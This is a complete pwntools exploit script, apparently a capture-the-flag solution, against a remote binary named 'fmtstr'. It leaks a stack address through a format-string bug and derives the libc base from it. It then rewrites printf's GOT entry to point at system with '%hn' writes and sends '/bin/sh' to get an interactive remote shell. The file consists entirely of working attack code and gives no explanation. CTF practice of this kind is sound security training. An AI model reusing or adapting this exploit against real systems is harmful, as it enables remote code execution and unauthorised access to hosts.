from pwn import *
p = remote("143.198.127.103",42002)
#p = process("./fmtstr")
context.log_level = 'debug'
elf = ELF("./fmtstr")
libc = ELF("./libc-2.31.so")

pause()
p.sendlineafter(":clown:)","N")

payload = 'leak:%25$p'
p.sendlineafter("first input:",str(payload))
p.recvuntil("leak:")
leak_ret = int(p.recv(14),16)

libc_base = leak_ret - libc.symbols['__libc_start_main'] - 234
printf_got = elf.got['printf']
system = libc_base + libc.symbols['system']

print("leak_ret:"+str(hex(leak_ret)))
print("printf_got:"+ str(hex(printf_got)))
print("system:"+ str(hex(system)))

system_low = system & 0xffff
system_middle = (system >> 16) & 0xffff
system_high = (system >> 32) & 0xffff

low = system_low
if system_middle > system_low:
    middle = system_middle - system_low
else:
    middle = 0x10000 + system_middle - system_low

if system_high > system_middle:
    high = system_high - system_middle
else:
    high = 0x10000 + system_high - system_middle
 
print("low:" + str(low))
print("middle:" + str(middle))
print("high:" + str(high))

# 16.04에서 하는걸로.....................
#payload =  b'%'+ bytes(str(low),'utf-8')+b'c'
#payload += b'%11$hn'
#payload += b'%'+ bytes(str(middle),'utf-8')+ b'c'
#payload += b'%12$hn'
#payload += b'%'+ bytes(str(high),'utf-8')+ b'c'
#payload += b'%13$hn'
#payload += b'A' * (8 - len(payload) % 8)
#payload += p64(printf_got)
#payload += p64(printf_got+2)
#payload += p64(printf_got+4)
#payload += p64(0)

def fmt(prev , target):
   if prev < target:
       result = target - prev
       return "%" + str(result)  + "c"
   elif prev == target:
       return ""
   else:
       result = 0x10000 + target - prev
       return "%" + str(result) + "c"

def fmt64(offset , target_addr , target_value , prev = 0):
   payload = ""
   for i in range(3):
       payload += p64(target_addr + i * 2)
   payload2 = ""
   for i in range(3):
       target = (target_value >> (i * 16)) & 0xffff
       payload2 += fmt(prev , target) + "%" + str(offset + 8 + i) + "$hn"
       prev = target
   payload = payload2.ljust(0x40 , "a") + payload
   return payload
   
payload = fmt64(6,printf_got,system)
p.sendlineafter("second input:",str(payload))

p.sendlineafter("last input:","/bin/sh\x00")



p.interactive()